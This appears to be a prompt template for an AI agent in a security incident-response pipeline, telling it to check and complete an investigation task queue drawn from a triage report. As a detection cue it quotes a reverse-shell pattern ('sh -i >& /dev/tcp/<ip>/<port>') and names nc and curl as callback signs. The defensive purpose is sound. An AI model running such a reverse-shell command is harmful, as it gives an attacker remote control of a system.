## Task: Verify and complete the investigation queue

The core investigation tasks have already been created directly from the triage report's `## Investigation Plan`. Your job is to **verify** completeness and **add** any mandatory tasks that the plan omitted.

**Step 1 — Verify.** Call `list_tasks` once. Check that every task listed in the "Already created" section exists. If any is missing, recreate it with `create_task`.

**Step 2 — Mandatory supplementary tasks.** Read the triage report below and check for evidence of the following. Add a task if no equivalent already exists:

- **Reverse-shell / C2 callback address** (e.g. `sh -i >& /dev/tcp/<ip>/<port>`, `nc`, `curl` to an external IP, attacker-controlled domain): add *'Investigate attacker-controlled destination \<ip\> — pivot to all SIEM events from/to that IP for SSH, HTTP, and connection evidence within the 48-hour window surrounding the alert.'* Priority 90.

- **Initial-access / login / SSH / remote-access event** where no initial-access task is already queued: add *'Establish initial access vector — source IP and earliest suspicious login session.'* Priority 85.

**Step 3 — Stop.** Do not add tasks that duplicate what is already queued. Do not invent tasks beyond the plan items and the two mandatory categories above. A single `list_tasks` call followed by at most one or two `create_task` calls is the expected output.

**When `create_task` fails:** read the error, propose a task that achieves the same investigative goal by an allowed method, and call `create_task` immediately with the revised parameters.

Do NOT run any SIEM queries, read files, or start investigating. Only call `create_task` and `list_tasks`.

**Fallback — missing plan section:** If the "Already created" section says "No tasks have been created yet", the triage report contained no parseable `## Investigation Plan`. In that case, read the full triage report and call `create_task` for every distinct investigative question raised — one task per question. Do not collapse multiple questions into a single generic task.
